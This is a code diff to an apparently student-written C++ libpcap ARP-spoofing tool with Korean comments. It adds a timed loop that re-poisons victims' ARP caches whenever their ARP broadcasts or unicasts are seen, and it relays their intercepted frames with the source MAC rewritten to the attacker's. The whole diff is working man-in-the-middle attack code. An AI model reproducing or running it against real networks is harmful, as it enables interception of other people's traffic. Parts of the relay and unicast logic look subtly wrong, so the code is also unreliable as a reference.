@@ -98,7 +98,7 @@ int findFlag = 0;
 // 리턴 안해도 되긴 하는데
 void sendARP(EthArpPacket packet, pcap_t* handle, int times, uint64_t sec) {
 	
-	for(int i = 0; i < times - 1; i++) {
+	for(int i = 0; i < times; i++) {
 		if(findFlag) {
 			cout << "sendARP end" << endl;
 			return;
@@ -236,9 +236,11 @@ void infection(pcap_t* handle, map<Ip, Mac> table, Ip me, Ip sender, Ip target, 
 // infection 시켰으면 계속 감시해야 함.
 // while문으로 돌려놓고 변수로 종료시키자
 // 쓰레드
-void watchPacket(pcap_t* handle, map<Ip, Mac> ARPtable, vector<pair<Ip, Ip>> IpTable) {
+void watchPacket(pcap_t* handle, map<Ip, Mac>& ARPtable, vector<pair<Ip, Ip>>& IpTable, Ip& me) {
 	struct pcap_pkthdr* pkheader;
 	const u_char* packet;
+	// relay용
+	u_char paste_packet[0x2000];
 	// parsePacket이랑 꼬이면 안됨
 	// 해결책 선택
 	// 1. parse(resolve)를 다 한 후에 공격을 한다
@@ -246,7 +248,15 @@ void watchPacket(pcap_t* handle, map<Ip, Mac> ARPtable, vector<pair<Ip, Ip>> IpT
 	// 2. parse랑 watch를 통합한다.
 	// 공유자원 문제 비스무리하게 .. 좀 복잡함.
 
+	auto startTime = std::chrono::system_clock::now();
 	while (1) {
+		findFlag = 0;
+		auto endTime = std::chrono::system_clock::now();
+		auto diff = std::chrono::duration_cast<std::chrono::seconds>(endTime-startTime);
+		if(diff.count() > 20) {
+			break;
+		}
+	
 		// critical section
 		int res = pcap_next_ex(handle, &pkheader, &packet);
 		//
@@ -261,19 +271,72 @@ void watchPacket(pcap_t* handle, map<Ip, Mac> ARPtable, vector<pair<Ip, Ip>> IpT
 	
 		// IP 패킷인지 ARP인지
 		// => ETH의 type정보를 확인
-		if(header.eth_.type_ == htons(EthHdr::Ip4)) {
+
+		
+		if(header.eth_.type_ != htons(EthHdr::Arp)) {
+			//cout << string(header.eth_.smac_) << ' ' << string(header.eth_.dmac_) << endl;
+			// flow를 해야하는지 확인
+			for(auto i : IpTable) {
+				// sender 확인
+				if(header.eth_.smac_ == ARPtable.find(i.first)->second) {
+					// src mac만 me로 바꿔서 보냄
+					memcpy(paste_packet, packet, pkheader->len);
+					Mac myMac = ARPtable.find(me)->second;
+					memcpy(&paste_packet[6], &myMac, 6);
+					//cout << paste_packet[6] << endl;
+					// sendARP(header, handle, 1, 0);
+					// critical section
+					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&paste_packet), pkheader->len);
+					//
+					if (res != 0) {
+						fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+						return;
+						//return FAIL;
+					}
+					cout << "relay" << endl;
+					break;
+				}
+			}
+			continue;
+		}
+		
+		// network byte order <-> host byte order
+		
+		cout << "this packet is ARP" << endl;
+		// broadcast인지 
+		cout << ntohl(header.arp_.sip_) << ' ' << ntohl(header.arp_.tip_) << endl;
+		if(header.eth_.dmac_ == Mac::broadcastMac()) {
+			for(auto i : IpTable) {
+				// 1. sender의 target에 대한 broadcast
+				if(ntohl(header.arp_.sip_) == uint32_t(i.first) && ntohl(header.arp_.tip_) == uint32_t(i.second)) {
+					cout << "case 1" << endl;
+					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
+					break;
+				}
+
+				// 2. target의 broadcast
+				if(ntohl(header.arp_.sip_) == uint32_t(i.second)) {
+					cout << "case 2" << endl;
+					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
+					break;
+				}
+			}
 
 		}
-		if(header.eth_.type_ != htons(EthHdr::Arp)) continue;
-		
-		// 1. sender의 target에 대한 broadcast
-		// 2. target의 broadcast
-		// 3. sender -> target unicast
+		// unicast인지
+		else {
+			for(auto i : IpTable) {
+				// 3. sender -> target unicast
+				if(header.arp_.sip_ == i.first && header.arp_.tip_ == i.second) {
+					cout << "case 3" << endl;
+					infection(handle, ARPtable, me, i.first, i.second, 3, 1);
+					break;
+				}
+			}
+			
+		}
 
 		// 4. target -> sender unicast => 인자를 2쌍 이상 받아서 처리하는 이유
-		
-
-
 	}
 }
 
